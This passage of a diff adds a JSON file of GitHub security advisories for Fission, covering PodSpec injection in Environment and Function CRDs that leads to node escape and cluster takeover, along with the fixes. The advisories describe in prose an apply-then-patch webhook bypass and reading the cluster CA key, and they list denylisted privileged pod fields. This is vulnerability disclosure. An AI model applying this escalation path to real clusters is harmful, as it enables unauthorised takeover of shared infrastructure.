(`pkg/apis/core/v1/podspec_safety.go::ValidatePodSpecSafety`), called from `Environment.Validate` for both `Runtime.PodSpec` and `Builder.PodSpec`:\n\n- pod-level: `HostNetwork`, `HostPID`, `HostIPC`, `ServiceAccountName` / `DeprecatedServiceAccount` override, hostPath volumes;\n- per-container: `SecurityContext.Privileged=true`, `SecurityContext.AllowPrivilegeEscalation=true`, dangerous capabilities (`SYS_ADMIN`, `NET_ADMIN`, `SYS_PTRACE`, `SYS_MODULE`, `DAC_READ_SEARCH`, `DAC_OVERRIDE`).\n\n**Update-bypass closed:** the `Environment` validating-webhook marker is extended from `verbs=create` to `verbs=create;update` (chart and envtest manifests aligned).\n\n**Merge-layer belt-and-braces** (`pkg/executor/util/merge.go`): even if admission is bypassed (`failurePolicy=Ignore` or stale pre-webhook objects), the denylisted pod-level fields are stripped and per-container dangerous settings are\nsanitized before the merge (with `SecurityContext` deep-copied first so cached informer objects are not mutated). Legitimate operator hardening via the chart's pod-level `securityContext` (fsGroup, runAsNonRoot, runAsUser) still flows\nthrough.\n\n### Behavioural change\n\nEnvironments that explicitly set any denylisted field are now rejected at admission. There is no legitimate Fission use case — these primitives exist for cluster operators, not Environment authors.\n\nThis is the same root cause and fix as GHSA-wmgg-3p4h-48x7.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/fission/fission/security-advisories/GHSA-gx55-f84r-v3r7",
+    "source_code_location": "https://github.com/fission/fission",
+    "identifiers": [
+      {
+        "value": "GHSA-gx55-f84r-v3r7",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-50564",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/fission/fission/security/advisories/GHSA-gx55-f84r-v3r7",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-50564",
+      "https://github.com/fission/fission/pull/3391",
+      "https://github.com/fission/fission/commit/e484df8460bb4e8026e24210120602aa7f181f64",
+      "https://github.com/fission/fission/releases/tag/v1.24.0",
+      "https://github.com/advisories/GHSA-gx55-f84r-v3r7"
+    ],
+    "published_at": "2026-06-30T18:19:32Z",
+    "updated_at": "2026-06-30T18:19:33Z",
+    "github_reviewed_at": "2026-06-30T18:19:32Z",
+    "nvd_published_at": "2026-06-10T18:17:12Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/fission/fission"
+        },
+        "vulnerable_version_range": "<= 1.23.0",
+        "first_patched_version": "1.24.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+        "score": 9.9
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-269",
+        "name": "Improper Privilege Management"
+      },
+      {
+        "cwe_id": "CWE-284",
+        "name": "Improper Access Control"
+      },
+      {
+        "cwe_id": "CWE-693",
+        "name": "Protection Mechanism Failure"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "0xVijay",
+          "id": 53905346,
+          "node_id": "MDQ6VXNlcjUzOTA1MzQ2",
+          "avatar_url": "https://avatars.githubusercontent.com/u/53905346?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/0xVijay",
+          "html_url": "https://github.com/0xVijay",
+          "followers_url": "https://api.github.com/users/0xVijay/followers",
+          "following_url": "https://api.github.com/users/0xVijay/following{/other_user}",
+          "gists_url": "https://api.github.com/users/0xVijay/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/0xVijay/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/0xVijay/subscriptions",
+          "organizations_url": "https://api.github.com/users/0xVijay/orgs",
+          "repos_url": "https://api.github.com/users/0xVijay/repos",
+          "events_url": "https://api.github.com/users/0xVijay/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/0xVijay/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "sanketsudake",
+          "id": 1511975,
+          "node_id": "MDQ6VXNlcjE1MTE5NzU=",
+          "avatar_url": "https://avatars.githubusercontent.com/u/1511975?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/sanketsudake",
+          "html_url": "https://github.com/sanketsudake",
+          "followers_url": "https://api.github.com/users/sanketsudake/followers",
+          "following_url": "https://api.github.com/users/sanketsudake/following{/other_user}",
+          "gists_url": "https://api.github.com/users/sanketsudake/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/sanketsudake/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/sanketsudake/subscriptions",
+          "organizations_url": "https://api.github.com/users/sanketsudake/orgs",
+          "repos_url": "https://api.github.com/users/sanketsudake/repos",
+          "events_url": "https://api.github.com/users/sanketsudake/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/sanketsudake/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "remediation_developer"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+      "score": 9.9
+    },
+    "epss": {
+      "percentage": 0.00274,
+      "percentile": 0.18957
+    }
+  },
+  {
+    "ghsa_id": "GHSA-v455-mv2v-5g92",
+    "cve_id": "CVE-2026-50563",
+    "url": "https://api.github.com/advisories/GHSA-v455-mv2v-5g92",
+    "html_url": "https://github.com/advisories/GHSA-v455-mv2v-5g92",
+    "summary": "Fission Container Executor Function PodSpec Injection Leading to Node Escape",
+    "description": "### Summary\n\nFission's Container Executor path lets a tenant supply `Function.spec.podspec` directly; the executor merges it into the executor-built podspec and creates a Deployment whose pods run the user's container image.\n\n### Details\n\nTwo flaws compounded:\n\n1. `pkg/apis/core/v1/validation.go::FunctionSpec.Validate` only checked that `spec.PodSpec != nil` when `executorType: container`; it did not inspect the content of `spec.PodSpec`.\n2. `pkg/executor/util/merge.go::MergePodSpec` unconditionally forwarded `hostPID`, `hostNetwork`, `hostIPC`, hostPath volumes, `serviceAccountName`, and container `privileged` into the Deployment spec via the container-executor sink\n(`pkg/executor/executortype/container/deployment.go::getDeploymentSpec`).\n\nA tenant with only `functions.fission.io/create` could deploy a Function with a crafted podspec that mounted the host root filesystem and shared host namespaces. The executor — running under its high-privilege SA, which holds\n`deployments/create` on the function namespace — created that Deployment on the tenant's behalf, turning Function-create into effective `deployments/create` with arbitrary pod-security configuration.\n\nThis is the Function-CRD sibling of GHSA-gx55-f84r-v3r7 / GHSA-wmgg-3p4h-48x7, with a **lower** attack threshold: regular function developers typically hold `functions/create` but not `environments/create`.\n\n### Impact\n\nA tenant with only `functions.fission.io/create` is escalated to node escape via a privileged, host-namespace pod scheduled by the executor.\n\n### Fix\n\nFixed in [#3391](https://github.com/fission/fission/pull/3391) and released in [v1.24.0](https://github.com/fission/fission/releases/tag/v1.24.0).\n\n- `FunctionSpec.Validate` now calls `ValidatePodSpecSafety(\"Function.spec.podspec\", spec.PodSpec)` after the existing `spec.PodSpec == nil` check.\n- The Function validating webhook is already registered on `verbs=create;update`, so it picks up the new validation with no marker change.\n- The same merge-layer strip and per-container sanitize used for the Environment path applies here, since the container-executor sink calls `util.MergePodSpec`.\n\nSee GHSA-gx55-f84r-v3r7 for the detailed fix.\n\n### Behavioural change\n\nFunctions whose `spec.podspec` sets host namespaces, hostPath volumes, container `privileged`/`allowPrivilegeEscalation`, dangerous Linux capabilities, or a `serviceAccountName` override are now rejected at admission. Legitimate\ncontainer-executor functions that set `image`, `command`, `args`, `env`, `resources`, `nodeSelector`, `tolerations`, `affinity`, non-hostPath `volumes`, or `volumeMounts` are unaffected.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/fission/fission/security-advisories/GHSA-v455-mv2v-5g92",
+    "source_code_location": "https://github.com/fission/fission",
+    "identifiers": [
+      {
+        "value": "GHSA-v455-mv2v-5g92",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-50563",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/fission/fission/security/advisories/GHSA-v455-mv2v-5g92",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-50563",
+      "https://github.com/fission/fission/pull/3391",
+      "https://github.com/fission/fission/commit/e484df8460bb4e8026e24210120602aa7f181f64",
+      "https://github.com/fission/fission/releases/tag/v1.24.0",
+      "https://github.com/advisories/GHSA-v455-mv2v-5g92"
+    ],
+    "published_at": "2026-06-30T18:18:42Z",
+    "updated_at": "2026-06-30T18:18:43Z",
+    "github_reviewed_at": "2026-06-30T18:18:42Z",
+    "nvd_published_at": "2026-06-10T18:17:12Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/fission/fission"
+        },
+        "vulnerable_version_range": "<= 1.23.0",
+        "first_patched_version": "1.24.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+        "score": 9.9
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-269",
+        "name": "Improper Privilege Management"
+      },
+      {
+        "cwe_id": "CWE-284",
+        "name": "Improper Access Control"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "j311yl0v3u",
+          "id": 102125416,
+          "node_id": "U_kgDOBhZPaA",
+          "avatar_url": "https://avatars.githubusercontent.com/u/102125416?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/j311yl0v3u",
+          "html_url": "https://github.com/j311yl0v3u",
+          "followers_url": "https://api.github.com/users/j311yl0v3u/followers",
+          "following_url": "https://api.github.com/users/j311yl0v3u/following{/other_user}",
+          "gists_url": "https://api.github.com/users/j311yl0v3u/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/j311yl0v3u/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/j311yl0v3u/subscriptions",
+          "organizations_url": "https://api.github.com/users/j311yl0v3u/orgs",
+          "repos_url": "https://api.github.com/users/j311yl0v3u/repos",
+          "events_url": "https://api.github.com/users/j311yl0v3u/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/j311yl0v3u/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "b0b0haha",
+          "id": 28356082,
+          "node_id": "MDQ6VXNlcjI4MzU2MDgy",
+          "avatar_url": "https://avatars.githubusercontent.com/u/28356082?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/b0b0haha",
+          "html_url": "https://github.com/b0b0haha",
+          "followers_url": "https://api.github.com/users/b0b0haha/followers",
+          "following_url": "https://api.github.com/users/b0b0haha/following{/other_user}",
+          "gists_url": "https://api.github.com/users/b0b0haha/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/b0b0haha/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/b0b0haha/subscriptions",
+          "organizations_url": "https://api.github.com/users/b0b0haha/orgs",
+          "repos_url": "https://api.github.com/users/b0b0haha/repos",
+          "events_url": "https://api.github.com/users/b0b0haha/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/b0b0haha/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "sanketsudake",
+          "id": 1511975,
+          "node_id": "MDQ6VXNlcjE1MTE5NzU=",
+          "avatar_url": "https://avatars.githubusercontent.com/u/1511975?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/sanketsudake",
+          "html_url": "https://github.com/sanketsudake",
+          "followers_url": "https://api.github.com/users/sanketsudake/followers",
+          "following_url": "https://api.github.com/users/sanketsudake/following{/other_user}",
+          "gists_url": "https://api.github.com/users/sanketsudake/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/sanketsudake/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/sanketsudake/subscriptions",
+          "organizations_url": "https://api.github.com/users/sanketsudake/orgs",
+          "repos_url": "https://api.github.com/users/sanketsudake/repos",
+          "events_url": "https://api.github.com/users/sanketsudake/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/sanketsudake/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "remediation_developer"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+      "score": 9.9
+    },
+    "epss": {
+      "percentage": 0.00274,
+      "percentile": 0.18957
+    }
+  },
+  {
+    "ghsa_id": "GHSA-wmgg-3p4h-48x7",
+    "cve_id": "CVE-2026-50545",
+    "url": "https://api.github.com/advisories/GHSA-wmgg-3p4h-48x7",
+    "html_url": "https://github.com/advisories/GHSA-wmgg-3p4h-48x7",
+    "summary": "Fission Environment CRD PodSpec Injection Leading to Node Escape and Cluster Takeover",
+    "description": "### Summary\n\nA stronger framing of the same root cause as GHSA-gx55-f84r-v3r7: the `Environment.spec.runtime.podSpec` / `spec.builder.podSpec` passthrough lacked validation, and `MergePodSpec` propagated dangerous fields into the generated pods.\n\n### Details\n\nThree independent flaws compounded:\n\n1. **Validate gap.** `pkg/apis/core/v1/validation.go::Environment.Validate` checked only container naming conventions, never `hostPID`/`hostIPC`/`hostNetwork`/`hostPath`/`privileged`.\n2. **UPDATE bypass.** The `pkg/webhook/environment.go` kubebuilder marker registered `verbs=create` only. A tenant could `kubectl apply` a clean Environment and then `kubectl patch` in the dangerous fields — the webhook was never called.\n3. **Merge propagation.** `pkg/executor/util/merge.go::MergePodSpec` unconditionally forwarded `HostPID`, `HostIPC`, `HostNetwork`, `Volumes` (including hostPath), `SecurityContext`, and `ServiceAccountName` into the Deployments\ngenerated by poolmgr / newdeploy / buildermgr.\n\nA `kubectl apply` plus a follow-up `kubectl patch` caused poolmgr to schedule a privileged pod with a host-root mount within roughly 20 seconds. From that pod the cluster CA private key was readable, allowing the attacker to sign\narbitrary kubelet certificates and achieve full cluster takeover.\n\n### Impact\n\n`environments.fission.io` create/update RBAC is escalated to node escape and, via the readable cluster CA key, full cluster takeover.\n\n### Fix\n\nFixed in [#3391](https://github.com/fission/fission/pull/3391) (with the companion buildermgr SA-token fix in [#3390](https://github.com/fission/fission/pull/3390)) and released in\n[v1.24.0](https://github.com/fission/fission/releases/tag/v1.24.0). Each enumerated flaw is addressed:\n\n1. **Validate** — `ValidatePodSpecSafety` is called from `Environment.Validate` for both `Runtime.PodSpec` and `Builder.PodSpec`.\n2. **UPDATE bypass** — the webhook marker is extended to `verbs=create;update`; chart and envtest manifests are aligned.\n3. **Merge propagation** — host namespaces, `ServiceAccountName`, and hostPath volumes are stripped at the merge layer; per-container `privileged`/`allowPrivilegeEscalation` and dangerous capabilities are sanitized.\n\nSee GHSA-gx55-f84r-v3r7 for the detailed fix — both advisories close to the same commit.\n\n### Duplicate handling\n\nThis advisory and GHSA-gx55-f84r-v3r7 were reported separately but close to the same code fix. Both are published to acknowledge each reporter's contribution and to keep the public CVE record clear about the multi-layer nature of the\nissue.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/fission/fission/security-advisories/GHSA-wmgg-3p4h-48x7",
+    "source_code_location": "https://github.com/fission/fission",
+    "identifiers": [
+      {
+        "value": "GHSA-wmgg-3p4h-48x7",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-50545",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/fission/fission/security/advisories/GHSA-wmgg-3p4h-48x7",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-50545",
+      "https://github.com/fission/fission/pull/3390",
+      "https://github.com/fission/fission/pull/3391",
+      "https://github.com/fission/fission/commit/8fa799417c77ce8a0189d9858bfe11ece29b84a6",
+      "https://github.com/fission/fission/commit/e484df8460bb4e8026e24210120602aa7f181f64",
+      "https://github.com/fission/fission/releases/tag/v1.24.0",
+      "https://github.com/advisories/GHSA-wmgg-3p4h-48x7"
+    ],
+    "published_at": "2026-06-30T18:18:05Z",
+    "updated_at": "2026-06-30T18:18:06Z",
+    "github_reviewed_at": "2026-06-30T18:18:05Z",
+    "nvd_published_at": "2026-06-10T18:17:12Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/fission/fission"
+        },
+        "vulnerable_version_range": "<= 1.23.0",
+        "first_patched_version": "1.24.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+        "score": 9.9
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-269",
+        "name": "Improper Privilege Management"
+      },
+      {
+        "cwe_id": "CWE-284",
+        "name": "Improper Access Control"
+      },
+      {
+        "cwe_id": "CWE-693",
+        "name": "Protection Mechanism Failure"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "j311yl0v3u",
+          "id": 102125416,
+          "node_id": "U_kgDOBhZPaA",
+          "avatar_url": "https://avatars.githubusercontent.com/u/102125416?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/j311yl0v3u",
+          "html_url": "https://github.com/j311yl0v3u",
+          "followers_url": "https://api.github.com/users/j311yl0v3u/followers",
+          "following_url": "https://api.github.com/users/j311yl0v3u/following{/other_user}",
+          "gists_url": "https://api.github.com/users/j311yl0v3u/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/j311yl0v3u/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/j311yl0v3u/subscriptions",
+          "organizations_url": "https://api.github.com/users/j311yl0v3u/orgs",
+          "repos_url": "https://api.github.com/users/j311yl0v3u/repos",
+          "events_url": "https://api.github.com/users/j311yl0v3u/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/j311yl0v3u/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "b0b0haha",
+          "id": 28356082,
+          "node_id": "MDQ6VXNlcjI4MzU2MDgy",
+          "avatar_url": "https://avatars.githubusercontent.com/u/28356082?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/b0b0haha",
+          "html_url": "https://github.com/b0b0haha",
+          "followers_url": "https://api.github.com/users/b0b0haha/followers",
+          "following_url": "https://api.github.com/users/b0b0haha/following{/other_user}",
+          "gists_url": "https://api.github.com/users/b0b0haha/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/b0b0haha/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/b0b0haha/subscriptions",
+          "organizations_url": "https://api.github.com/users/b0b0haha/orgs",
+          "repos_url": "https://api.github.com/users/b0b0haha/repos",
+          "events_url": "https://api.github.com/users/b0b0haha/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/b0b0haha/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "sanketsudake",
+          "id": 1511975,
+          "node_id": "MDQ6VXNlcjE1MTE5NzU=",
+          "avatar_url": "https://avatars.githubusercontent.com/u/1511975?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/sanketsudake",
+          "html_url": "https://github.com/sanketsudake",
+          "followers_url": "https://api.github.com/users/sanketsudake/followers",
+          "following_url": "https://api.github.com/users/sanketsudake/following{/other_user}",
+          "gists_url": "https://api.github.com/users/sanketsudake/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/sanketsudake/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/sanketsudake/subscriptions",
+          "organizations_url": "https://api.github.com/users/sanketsudake/orgs",
+          "repos_url": "https://api.github.com/users/sanketsudake/repos",
+          "events_url": "https://api.github.com/users/sanketsudake/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/sanketsudake/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "remediation_developer"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+      "score": 9.9
+    },
+    "epss": {
+      "percentage": 0.003,
+      "percentile": 0.21537
+    }
+  }
+]
